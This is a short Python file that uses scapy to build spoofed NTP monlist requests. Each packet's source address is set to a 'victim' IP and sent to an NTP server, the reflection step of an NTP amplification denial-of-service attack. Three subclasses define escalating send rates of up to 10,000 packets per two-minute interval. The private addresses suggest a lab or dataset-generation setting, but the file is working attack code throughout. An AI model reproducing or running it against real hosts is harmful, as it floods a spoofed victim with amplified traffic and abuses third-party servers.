import numpy as np
from typing import Self
from scapy.all import IP, UDP, Packet, Raw


class monlist:
    show = False
    verbose = False
    test = False
    victim_ip = "10.9.0.100"
    ntp_server_ip = "192.168.130.49"

    def create(self: Self) -> Packet:
        ip_layer = IP(src=self.victim_ip, dst=self.ntp_server_ip)
        udp_layer = UDP(dport=123)
        data = "\x17\x00\x03\x2a" + "\x00" * 4
        return ip_layer / udp_layer / Raw(load=data)


class ntp_ampl_attack_0(monlist):
    ref = np.array(
        [
            26,
            26,
            26,
            26,
            26
        ]
    )
    count = list(map(round, ref))
    interval_seconds = list(120 / ref)
    duration_seconds = 2 * 60 * len(ref)


class ntp_ampl_attack_1(monlist):
    ref = np.array(
        [
            26,
            1000,
            3000,
            3000,
            3000
        ]
    )
    count = list(map(round, ref))
    interval_seconds = list(120 / ref)
    duration_seconds = 2 * 60 * len(ref)


class ntp_ampl_attack_2(monlist):
    ref = np.array(
        [
            26,
            1000,
            10000,
            10000,
            10000
        ]
    )
    count = list(map(round, ref))
    interval_seconds = list(120 / ref)
    duration_seconds = 2 * 60 * len(ref)
